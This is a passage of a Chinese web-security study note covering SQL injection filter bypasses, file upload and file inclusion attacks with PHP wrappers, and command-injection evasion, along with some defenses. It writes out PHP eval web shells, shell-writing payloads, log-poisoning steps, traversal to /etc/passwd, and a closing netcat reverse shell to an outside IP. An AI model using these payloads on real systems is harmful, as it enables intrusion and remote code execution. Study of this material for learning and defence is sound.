<h4 id="8-2-内联注释"><a href="#8-2-内联注释" class="headerlink" title="8.2 内联注释"></a>8.2 内联注释</h4><blockquote>
<p>原理：MySQL会执行放在 /<em>! … </em>/ 中的语句，当前数据库版本高于语句中的版本则会执行语句，低于则会报错。</p>
<p>例：<code>/*!50173select*/ * /*!from*/ user ;</code>（50173：5.01.73）</p>
</blockquote>
<h4 id="8-3-复写"><a href="#8-3-复写" class="headerlink" title="8.3 复写"></a>8.3 复写</h4><ul>
<li><p>双写</p>
<blockquote>
<p><code>seLeCt</code></p>
</blockquote>
</li>
<li><p>大小写</p>
<blockquote>
<p>原理：利用 preg_replace 对指定字符过滤，会将指定字符转化成空（仅一次）</p>
<p><code>seselectlect</code></p>
</blockquote>
</li>
</ul>
<h4 id="8-4-编码"><a href="#8-4-编码" class="headerlink" title="8.4 编码"></a>8.4 编码</h4><ol>
<li>双重 url ：<code>%256c</code>== <code>%6c</code>（%25 是 % 的 url 码）</li>
<li>十六进制：<code>&#39;users&#39;</code>==<code>0x7573657273 / database()</code> 代替 ‘name’</li>
<li>Unicode编码：<code>%u006c</code></li>
<li>ASCII码：<code>CHAR( 100 )</code></li>
</ol>
<ul>
<li>等价字符<ol>
<li>like 或 in 代替 =</li>
<li>逗号替换：<code>select substr(database(),1,1)</code> 换成 <code>select substr(database() from 1 for 1)</code></li>
</ol>
</li>
<li>等价函数<ol>
<li><code>sleep</code> == <code>benchmark</code></li>
<li><code>ascii</code> == <code>hex，bin</code></li>
<li><code>group_concat</code> == <code>concat_ws</code></li>
<li><code>updatexml</code> == <code>extractvalue</code></li>
<li>字符串截取函数：<code>mid、substr、substring、left、reverse</code></li>
</ol>
</li>
</ul>
<h3 id="9-SQL加固防护"><a href="#9-SQL加固防护" class="headerlink" title="9 SQL加固防护"></a>9 SQL加固防护</h3><h4 id="9-1-数字型"><a href="#9-1-数字型" class="headerlink" title="9.1 数字型"></a>9.1 数字型</h4><p><code>int intval( mixed $var [ , int $base = 10 ] )</code>：进制转化<br>（base：0（自动检测）、其他为其他进制）</p>
<h4 id="9-2-字符型"><a href="#9-2-字符型" class="headerlink" title="9.2 字符型"></a>9.2 字符型</h4><ul>
<li><p>htmlspecialchars( str )</p>
<blockquote>
<p>把预定义字符转化成 html 实体（默认不对单引号转化，要加  ENT_QUOTES 参数才会转化</p>
</blockquote>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>字符</th>
<th>转义</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;</td>
<td>&amp;amp</td>
</tr>
<tr>
<td>“</td>
<td>&amp;quot</td>
</tr>
<tr>
<td>‘</td>
<td>&amp;#039</td>
</tr>
<tr>
<td>&lt;</td>
<td>&amp;lt</td>
</tr>
<tr>
<td>&gt;</td>
<td>&amp;gt</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>mysql_real_escape_string( str )</p>
<blockquote>
<p>对 sql 语句中 str 使用的特殊字符进行转义（\0x00、\n、\r、’、”、\x1a）。<br>成功转义返回字符串，否则返回 false。<br>PHP4.3.0以上才可使用，PHP5.3中已经弃用了</p>
</blockquote>
</li>
<li><p>addslashes( str )</p>
<blockquote>
<p>预定义字符前加反斜杠，返回字符</p>
<p>预定义字符：’、”、\、null</p>
</blockquote>
</li>
</ul>
<h4 id="9-3-参数化查询"><a href="#9-3-参数化查询" class="headerlink" title="9.3 参数化查询"></a>9.3 参数化查询</h4><ul>
<li>mysqli：( name = ? )</li>
<li>PDO：( name = : username )</li>
</ul>
<h4 id="9-4-服务器配置"><a href="#9-4-服务器配置" class="headerlink" title="9.4 服务器配置"></a>9.4 服务器配置</h4><ul>
<li><p>magic_quotes_gpc = on</p>
<blockquote>
<p>自动转义预定义字符（addslashes函数），自 PHP5.3.0 起废弃并自 PHP5.4.0 移除。</p>
</blockquote>
</li>
<li><p>magic_quotes_sybase = on</p>
<blockquote>
<p>单引号会转义成两个单引号。（须开始 magic_quotes_gpc 和 magic_quotes_sybase 才生效）</p>
</blockquote>
</li>
</ul>
<hr>
<h2 id="※二、身份认证攻击"><a href="#※二、身份认证攻击" class="headerlink" title="※二、身份认证攻击"></a>※二、身份认证攻击</h2><hr>
<h2 id="三、文件上传漏洞"><a href="#三、文件上传漏洞" class="headerlink" title="三、文件上传漏洞"></a>三、文件上传漏洞</h2><h3 id="1-文件本身绕过"><a href="#1-文件本身绕过" class="headerlink" title="1 文件本身绕过"></a>1 文件本身绕过</h3><h4 id="1-1-JS过滤绕过"><a href="#1-1-JS过滤绕过" class="headerlink" title="1.1 JS过滤绕过"></a>1.1 JS过滤绕过</h4><ul>
<li><p>代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> allow_ext=<span class="string">&quot;.jpg | .jpeg | .png | .gif | .bmp</span></span><br><span class="line"><span class="string">if (allow_ext.indexOf(ext_name + &quot;</span>|<span class="string">&quot;) == -1 )</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Error!; </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>绕过：</p>
<ol>
<li><p>先把木马扩展名改成 .jpg ，再抓包改成 .php</p>
</li>
<li><p>修改 js 代码</p>
</li>
<li><p>禁用 js 代码</p>
<blockquote>
<p>Edge：设置——搜索JavaScript——禁用</p>
</blockquote>
</li>
</ol>
</li>
</ul>
<h4 id="1-2-文件名绕过"><a href="#1-2-文件名绕过" class="headerlink" title="1.2 文件名绕过"></a>1.2 文件名绕过</h4><ul>
<li><p><code>if($type == &quot;php&quot;)</code>：大小写绕过（phP、PhP、php3、phtml）（双写：phphpp）</p>
</li>
<li><p>常见 Content-Type 类型</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>值</th>
<th>格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>text/html</td>
<td>HTML格式</td>
</tr>
<tr>
<td>text/plain</td>
<td>纯文本格式</td>
</tr>
<tr>
<td>text/xml</td>
<td>XML格式</td>
</tr>
<tr>
<td>image/gif</td>
<td>gif图片格式</td>
</tr>
<tr>
<td>image/jpeg</td>
<td>jpg图片格式</td>
</tr>
<tr>
<td>image/png</td>
<td>png图片格式</td>
</tr>
<tr>
<td>application/xml</td>
<td>XML数据格式</td>
</tr>
<tr>
<td>application/json</td>
<td>JSON数据格式</td>
</tr>
<tr>
<td>application/pdf</td>
<td>pdf格式</td>
</tr>
<tr>
<td>application/msword</td>
<td>Word文档格式</td>
</tr>
<tr>
<td>application/octet-stream</td>
<td>二进制流数据（PHP）</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>常见文件头</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>文件</th>
<th>文件头</th>
</tr>
</thead>
<tbody>
<tr>
<td>JPEG</td>
<td>0xFFD8FF</td>
</tr>
<tr>
<td>PNG</td>
<td>0x89504E470D0A1A0A</td>
</tr>
<tr>
<td>GIF</td>
<td>47 49 46 38 39 61 （或直接在 txt 前加上 GIF89a）</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>木马</p>
<p><code>GIF89a&lt;?php @eval($_REQUEST[123]); ?&gt;</code>（绕过函数 exif_imagetype）</p>
</li>
<li><p>隐藏文件</p>
<p><code>copy 111.jpg /b + a.txt /a test.php</code>（类型会检测的话再修改类型）</p>
</li>
</ul>
<h4 id="1-3-文件截断上传"><a href="#1-3-文件截断上传" class="headerlink" title="1.3 文件截断上传"></a>1.3 文件截断上传</h4><ol>
<li><p>PHP &lt; 5.3.4</p>
</li>
<li><p>magic_quotes_gpc = off</p>
</li>
<li><p>传文件的路径可控</p>
<blockquote>
<p>然后在上传的文件前改一个字符为%00，后面的 php 文件就不会被处理。</p>
<p>例：<code>https://xxx.com/upload/?filename=test.php%00.txt</code></p>
</blockquote>
</li>
</ol>
<h3 id="2-其他文件绕过"><a href="#2-其他文件绕过" class="headerlink" title="2 其他文件绕过"></a>2 其他文件绕过</h3><h4 id="2-1-htaccess文件上传"><a href="#2-1-htaccess文件上传" class="headerlink" title="2.1 .htaccess文件上传"></a>2.1 .htaccess文件上传</h4><blockquote>
<p>原理：.htaccess文件是Web服务器的一个配置文件，可以配置文件的解析方式、重定向等配置。</p>
</blockquote>
<ul>
<li><p>开启配置</p>
<ol>
<li>Options FollowSymLinks AllowOverride None 改 All</li>
<li>LoadModule rewrite_module modules/mod_rewrite.so（去掉注释，开启 rewrite 模块）</li>
</ol>
</li>
<li><p>文件配置</p>
<ol>
<li><p>指定文件名</p>
<p><code>&lt;Files test.jpg&gt;ForceType application/x-httpd-php SetHandler application/x-httpd-php&lt;/Files&gt;</code></p>
</li>
<li><p>指定文件后缀</p>
<p><code>AddType application/x-httpd-php .jpg</code></p>
</li>
</ol>
</li>
<li><p>利用流程</p>
<ol>
<li>构造 .htaccess 文件：内容是文件配置（在windows上无法直接创建，因为无文件名。可以先创建一个有文件名的文件，之后抓包删去）</li>
<li>构造图片木马文件：copy .jpg /b + .txt .jpg</li>
<li>上传 .htaccess 和木马文件完成攻击。</li>
</ol>
</li>
</ul>
<h4 id="2-2-user-ini"><a href="#2-2-user-ini" class="headerlink" title="2.2 .user.ini"></a>2.2 .user.ini</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html">.user.ini</a></p>
<p>同理 .htaccess</p>
<p>自动包含jpg到同目录下的php中：auto_prepend_file=flag.jpg</p>
</blockquote>
<h4 id="2-3-竞争条件上传"><a href="#2-3-竞争条件上传" class="headerlink" title="2.3 竞争条件上传"></a>2.3 竞争条件上传</h4><blockquote>
<p>原理：在上传的文件未被消灭之前进行访问，从而生成新的文件存在文件夹中。之后访问新的文件夹便可进行漏洞利用。</p>
<p>木马：<code>&lt;?php fputs(fopen(&quot;shell.php&quot; , &quot;w&quot;) , &quot;&lt;?php @eval($_POST[123]); ? &gt;&quot;)&gt;</code><br>（原理：创建一个 shell.php 文件，内容为后面的字符串）</p>
<p>攻击：BP——Intruder——Sniper——Payloads——Null payloads &amp;&amp; Generate:10000（抓两个包，一个上传文件，一个访问文件，和服务器竞争）</p>
</blockquote>
<h3 id="3-字符绕过"><a href="#3-字符绕过" class="headerlink" title="3 字符绕过"></a>3 字符绕过</h3><h4 id="3-1-短标签绕过"><a href="#3-1-短标签绕过" class="headerlink" title="3.1 短标签绕过"></a>3.1 短标签绕过</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-415762.html">短标签绕过原理</a></p>
<p>“&lt;?=”是PHP的一个短的开放式标签，是echo() 的快捷用法。</p>
<p>PHP.ini——short_open_tag=On。（但是，从PHP版本5.4.0开始，无论PHP.ini文件中的设置如何，都可以使用短标签。）</p>
<p>例：<code>&lt;?=eval($_POST[&#39;cmd&#39;]; ?)&gt;</code></p>
</blockquote>
<h3 id="4-防护"><a href="#4-防护" class="headerlink" title="4 防护"></a>4 防护</h3><ol>
<li>使用白名单限制文件上传的类型。</li>
<li>对上传文件进行随机重命名，并且文件的扩展名不允许用户自定义。</li>
<li>对保存上传的文件的文件夹进行权限限制，去掉脚本的执行权限。（让上传的文件不可以被执行）</li>
<li>对文件的内容进行恶意代码检测。</li>
</ol>
<hr>
<h2 id="※四、文件下载漏洞"><a href="#※四、文件下载漏洞" class="headerlink" title="※四、文件下载漏洞"></a>※四、文件下载漏洞</h2><hr>
<h2 id="五、文件包含漏洞"><a href="#五、文件包含漏洞" class="headerlink" title="五、文件包含漏洞"></a>五、文件包含漏洞</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote>
<p>文件包含函数的参数没有经过过滤或者严格的定义，并且参数可以被用户控制，这样就可以包含非预期的文件。</p>
<p>include / include_once / require / require_once</p>
</blockquote>
<ul>
<li><p>特征</p>
<ul>
<li>?page=a.php</li>
<li>?home=b.html</li>
<li>?file=content</li>
</ul>
</li>
<li><p>路径</p>
<ul>
<li>Windows：<ul>
<li>c:\boot.ini【系统版本信息】</li>
<li>c:\xxx\php.ini【PHP配置信息】</li>
<li>c:\xxx\my.ini【MySQL配置信息】</li>
<li>c:\xxx\httpd.conf【Apache配置信息】</li>
</ul>
</li>
<li>Linux：<ul>
<li>/etc/passwd【Linux系统账号信息】</li>
<li>/etc/httpd/conf/httpd.conf【Apache配置信息】</li>
<li>/etc/my.conf【MySQL配置信息】</li>
<li>/usr/etc/php.ini【PHP配置信息】</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-本地包含"><a href="#2-本地包含" class="headerlink" title="2 本地包含"></a>2 本地包含</h3><ul>
<li><p>无限制</p>
<blockquote>
<p><code>?filename=../../../../../../../../../../../../etc/passwd</code></p>
</blockquote>
</li>
<li><p>有限制</p>
<ol>
<li><p>%00截断（截断后面的扩展名）</p>
<blockquote>
<p>条件：magic_quotes_gpc=off，V（PHP）&lt; 5.3.4</p>
</blockquote>
</li>
<li><p>路径长度截断</p>
<blockquote>
<p>Windows路径最长 256B，Linux 4096B（限 32 位）</p>
<p><code>?filename=test.txt./././././</code> * 256B （截断）</p>
</blockquote>
</li>
<li><p>点号截断</p>
<blockquote>
<p>同理 2</p>
<p><code>?fliename=test.txt.................</code></p>
</blockquote>
</li>
</ol>
</li>
</ul>
<h3 id="3-系统文件包含"><a href="#3-系统文件包含" class="headerlink" title="3 系统文件包含"></a>3 系统文件包含</h3><ul>
<li><p>Session文件<br>Linux：/var/lib/php/session（服务器存 session 格式：sess_id）</p>
<ol>
<li><code>?filename=&lt;?php phpinfo(); ?&gt;</code>（要编码）</li>
<li>利用 F12 找到 session 值</li>
<li>?filename=/var/lib/php/sess_id（访问成功表示成功）</li>
</ol>
</li>
<li><p>日志文件</p>
<ul>
<li><p>中间件日志</p>
<blockquote>
<p>条件是已知路径，且有可读权限。（ CentOS 的 Apache 日志在 /var/log/httpd，默认名 access_log ）</p>
<p><code>&lt;?php @eval($_POST[123])?&gt;</code>：抓包改编码（URL编码导致无法使用）</p>
<p>访问路径，key 是 123</p>
</blockquote>
</li>
<li><p>SSH日志：</p>
<blockquote>
<p>路径已知，可读。（ /var/log/auth.log ）</p>
<p><code>ssh &quot;&lt;?php @eval($_POST[123])?&gt;&quot;@ip</code></p>
<p>访问，key 是 123</p>
</blockquote>
</li>
</ul>
</li>
<li><p>远程文件</p>
<ul>
<li><p>原理</p>
<blockquote>
<p>包含其他服务器的文件（是其他服务器的执行结果发给新服务器）</p>
</blockquote>
</li>
<li><p>条件：allow_url_fopen = on 和 allow_url_include = on</p>
<p><code>?filename=http://ip/php.txt</code></p>
</li>
<li><p>绕过（截断后面的扩展名）</p>
<ol>
<li>问号，php.txt?</li>
<li>井号，php.txt%23</li>
<li>空格，php.txt%20</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 id="4-PHP常用伪协议"><a href="#4-PHP常用伪协议" class="headerlink" title="4 PHP常用伪协议"></a>4 PHP常用伪协议</h3><h4 id="4-1-filter"><a href="#4-1-filter" class="headerlink" title="4.1 filter"></a>4.1 filter</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/niyani/p/16954041.html">绕过</a>     <a target="_blank" rel="noopener" href="https://www.coder.work/article/156675">iconv编码列表</a></p>
</blockquote>
<ul>
<li><p>作用</p>
<blockquote>
<p>访问本地文件系统。（无条件）</p>
<p>[read=] / [write=]</p>
<p>对数据进行读取。在include后如果不编码，文件内容将会被包含到当前文件中，然后作为代码执行，而编码后包含进来的代码不可被执行了，所以会显示出来。</p>
</blockquote>
</li>
<li><p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读文件的base64编码（不加解码的话就是执行php）</span></span><br><span class="line">?filename=php:<span class="comment">//filter/[read=]convert.base64-encode/resource=xxx.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码（用于绕过base64编码禁止）</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=xxx.php</span></span><br><span class="line">?filename=php:<span class="comment">//filter/convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;/resource=xxx.php</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="4-2-input"><a href="#4-2-input" class="headerlink" title="4.2 input"></a>4.2 input</h4><ul>
<li><p>作用</p>
<blockquote>
<p>读取POST上没有经过解析的原始数据。</p>
</blockquote>
</li>
<li><p>限制</p>
<blockquote>
<p>使用 enctype=”multipart/form-data” 该伪协议无效。</p>
</blockquote>
</li>
</ul>
<ol>
<li><p>读取 post 数据（无条件）</p>
<blockquote>
<ul>
<li>上传文件：<code>&lt;?php echo file_get_contents(&quot;php://input&quot;)&gt;;
/post.php</code></li>
<li>post操作：<code>data</code>，回显 data</li>
</ul>
</blockquote>
</li>
<li><p>写木马（allow_url_include开启）</p>
<blockquote>
<ul>
<li>上传文件：<code>filename=php://input</code></li>
<li>post操作：<code>&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li>
</ul>
</blockquote>
</li>
<li><p>执行命令（allow_url_include开启）</p>
<blockquote>
<ul>
<li><p>上传文件：<code>filename=php://input</code></p>
</li>
<li><p>post操作：<code>system</code></p>
</li>
</ul>
</blockquote>
</li>
</ol>
<h4 id="4-3-file"><a href="#4-3-file" class="headerlink" title="4.3 file"></a>4.3 file</h4><ul>
<li><p>作用</p>
<blockquote>
<p>访问本地系统文件，读取文件内容。（无条件）</p>
</blockquote>
</li>
<li><p>代码</p>
<blockquote>
<p><code>?filename=file://c:/boot.ini</code></p>
</blockquote>
</li>
</ul>
<h4 id="4-4-data"><a href="#4-4-data" class="headerlink" title="4.4 data"></a>4.4 data</h4><ul>
<li><p>作用</p>
<blockquote>
<p>读取数据，传入代码的话代码就会被执行。</p>
<p>allow_url_fopen 和 allow_url_include 开启</p>
</blockquote>
</li>
<li><p>代码</p>
<blockquote>
<p><code>?filename=data://text/plain;base64,&lt;data&gt;</code></p>
<p>data是base64编码后数据</p>
</blockquote>
</li>
<li><p>例</p>
<blockquote>
<p><code>data=PD9waHAgcGhwaW5mbygpOz8%2b</code>（<code>&lt;?php phpinfo();?&gt;</code>）</p>
</blockquote>
</li>
</ul>
<h4 id="4-5-phar"><a href="#4-5-phar" class="headerlink" title="4.5 phar"></a>4.5 phar</h4><ul>
<li><p>作用</p>
<blockquote>
<p>解压，无论什么扩展名都会被当成压缩包。</p>
<p>allow_url_fopen 和 allow_url_include 开启</p>
</blockquote>
</li>
<li><p>代码</p>
<blockquote>
<p><code>?file=phar://压缩包/内部文件</code></p>
</blockquote>
</li>
<li><p>例</p>
<blockquote>
<p><code>?file=phar://shell.png/shell.php</code></p>
</blockquote>
</li>
</ul>
<h4 id="4-6-zip"><a href="#4-6-zip" class="headerlink" title="4.6 zip"></a>4.6 zip</h4><ul>
<li><p>作用</p>
<blockquote>
<p>同理 phar，用法不同。</p>
</blockquote>
</li>
<li><p>代码</p>
<blockquote>
<p><code>?file=zip://[压缩文件绝对路径] # [子文件名]</code></p>
</blockquote>
</li>
<li><p>例</p>
<blockquote>
<p><code>?file=zip://shell.png%23shell.php</code></p>
</blockquote>
</li>
</ul>
<h4 id="4-7-expect"><a href="#4-7-expect" class="headerlink" title="4.7 expect"></a>4.7 expect</h4><ul>
<li><p>作用</p>
<blockquote>
<p>处理交互式流。主要用来执行系统命令，需要装扩展。</p>
</blockquote>
</li>
<li><p>例</p>
<blockquote>
<p><code>?file=expect://ls</code></p>
</blockquote>
</li>
</ul>
<h3 id="5-PHP不常用伪协议"><a href="#5-PHP不常用伪协议" class="headerlink" title="5 PHP不常用伪协议"></a>5 PHP不常用伪协议</h3><ul>
<li><p>http</p>
<blockquote>
<p>作用：访问 http(s) url。</p>
</blockquote>
</li>
<li><p>ftp</p>
<blockquote>
<p>作用：访问 ftp(s) url。</p>
</blockquote>
</li>
<li><p>php</p>
<blockquote>
<p>作用：访问各个输入输出流。</p>
</blockquote>
</li>
<li><p>zlib</p>
<blockquote>
<p>作用：处理压缩流。</p>
</blockquote>
</li>
<li><p>glob</p>
<blockquote>
<p>作用：查找匹配的文件路径模式。</p>
</blockquote>
</li>
<li><p>ssh2</p>
<blockquote>
<p>作用：Secure Shell 2。</p>
</blockquote>
</li>
<li><p>rar</p>
<blockquote>
<p>作用：RAR数据压缩</p>
</blockquote>
</li>
<li><p>ogg</p>
<blockquote>
<p>作用：处理音频流。</p>
</blockquote>
</li>
</ul>
<h3 id="6-防护"><a href="#6-防护" class="headerlink" title="6 防护"></a>6 防护</h3><ul>
<li><p>代码层</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;home&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;/var/www/html/&#x27;</span> .<span class="variable">$filename</span> .<span class="string">&#x27;.php&#x27;</span>;<span class="keyword">break</span>; </span><br><span class="line">    <span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置</p>
<ol>
<li>包含特定目录：<code>open_basedir=/var/www/html/</code>。（最后一个 / 要加）</li>
<li>关闭 all_url_include。</li>
</ol>
</li>
</ul>
<hr>
<h2 id="六、命令执行漏洞"><a href="#六、命令执行漏洞" class="headerlink" title="六、命令执行漏洞"></a>六、命令执行漏洞</h2><h3 id="1-php函数"><a href="#1-php函数" class="headerlink" title="1 php函数"></a>1 php函数</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/figli/article/details/41007573">proc_open</a>   </p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1344774">stream_get_contents</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 执行外部程序并输出。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span> [,<span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部程序，输出需要加上 echo。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span> [,<span class="keyword">array</span> &amp;<span class="variable">$output</span> [,<span class="keyword">int</span> &amp;<span class="variable">$return</span> _var]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># shell 执行，输出需要加上 echo。</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行外部程序并显示原始输出。    </span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">passthru</span>( <span class="keyword">string</span> <span class="variable">$command</span> [ , <span class="keyword">int</span> &amp;<span class="variable">$return_var</span>])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;whoami&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开进程文件指针。</span></span><br><span class="line">resource <span class="title function_ invoke__">popen</span>( <span class="keyword">string</span> <span class="variable">$command</span> , <span class="keyword">string</span> <span class="variable">$mode</span>)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">popen</span>(<span class="string">&quot;touch test.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="meta">?&gt;</span> <span class="comment"># 可以在服务器中创建文件。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令，并打开用来输入输出的文件指针。</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>,<span class="keyword">array</span> <span class="variable">$descriptorspec</span>,<span class="keyword">array</span> &amp;<span class="variable">$pipes</span>[,<span class="keyword">string</span> <span class="variable">$cmd</span>[,<span class="keyword">array</span> <span class="variable">$env</span> [,<span class="keyword">array</span> <span class="variable">$other_options</span>]]])</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$proc</span> = <span class="title function_ invoke__">poroc_open</span>(<span class="string">&quot;whoami&quot;</span>,<span class="keyword">array</span>( <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)),<span class="variable">$pipes</span> );<span class="keyword">print</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将反引号作为 shell 命令尝试执行。</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span>`whoami` <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-Windows函数"><a href="#2-Windows函数" class="headerlink" title="2 Windows函数"></a>2 Windows函数</h3><blockquote>
<p><a href="..\..\Main\OS_Security\Windows操作系统.md">Windows操作系统</a>——Bat脚本——特殊字符。</p>
<p>&amp;：前后都执行。</p>
<p>|：仅执行最后（当参数）。</p>
</blockquote>
<h3 id="3-Linux函数"><a href="#3-Linux函数" class="headerlink" title="3 Linux函数"></a>3 Linux函数</h3><blockquote>
<p><a href="..\..\Main\OS_Security\Ubuntu LInux.md">Ubuntu Linux</a>——高级技巧——命令排列。</p>
<p>; ：所有命令都被执行。</p>
<p>&amp;：多条命令在后台执行。</p>
</blockquote>
<h3 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4 绕过"></a>4 绕过</h3><h4 id="4-1-空格绕过"><a href="#4-1-空格绕过" class="headerlink" title="4.1 空格绕过"></a>4.1 空格绕过</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://liloong3t.com/2021/02/25/2021-2-25-chu-ji-ming-ling-zhi-xing-rao-guo-zong-jie/"><script type="math/tex">IFS</script>9原理</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># $&#123;IFS&#125;：shell 特殊环境变量，内部域分隔符，默认空白字符（空格，制表符和换行符等）</span></span><br><span class="line">cat$&#123;IFS&#125;<span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">$IFS$<span class="number">9</span>，$IFS$<span class="number">1</span> <span class="comment"># 空格</span></span><br><span class="line"><span class="variable">$PS2</span> <span class="comment"># &gt;</span></span><br><span class="line"><span class="variable">$PS4</span> <span class="comment"># +</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url 编码，制表符代替空格。</span></span><br><span class="line">%<span class="number">09</span></span><br><span class="line"><span class="comment"># &#123;&#125;</span></span><br><span class="line">&#123; cat , <span class="number">1</span>.php &#125;</span><br><span class="line"><span class="comment"># 重定向输入</span></span><br><span class="line">cat&lt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>
<h4 id="4-2-关键字绕过"><a href="#4-2-关键字绕过" class="headerlink" title="4.2 关键字绕过"></a>4.2 关键字绕过</h4><ul>
<li><p>变量赋值</p>
<blockquote>
<p>原理：php 变量可以转换成值后直接拼接成字符串。</p>
</blockquote>
<p><code>a=c;b=at;$a$b 1.php</code></p>
</li>
<li><p>空变量</p>
<blockquote>
<p>原理：空变量等于空。</p>
</blockquote>
<p><code>ca$&#123;x&#125;t 1.php</code></p>
</li>
<li><p>系统变量</p>
<blockquote>
<p>原理：系统变量自带值，直接提取系统变量中的值使用。</p>
<p> 查看系统值：<code>echo $&#123;SHELLOPTS&#125;</code></p>
</blockquote>
<p><code>$&#123;SHELLOPTS:3:1&#125;at 1.php</code></p>
</li>
<li><p>\绕过</p>
<blockquote>
<p>原理：换行输入。</p>
</blockquote>
<p><code>c\a\t 1.php</code></p>
</li>
<li><p>通配符</p>
<ul>
<li><p>0 - n 个字符。</p>
</li>
<li><p>?  一个任意字符。</p>
</li>
<li><p>[]  字符范围，表示该范围内任一字符。（例：[a~z]）</p>
<p><code>/etc/passwd：cat /???/???sw?</code></p>
</li>
</ul>
</li>
<li><p>shell反弹</p>
<blockquote>
<p>原理：让客户机连接自己，自己作为服务器。</p>
<p>IP绕过：IP转化为十进制。</p>
<p>建立服务器：<code>nc -lp port</code></p>
</blockquote>
<ul>
<li>原命令：<br><code>/bin/nc 192.168.91.138 8888 -e /bin/bash</code></li>
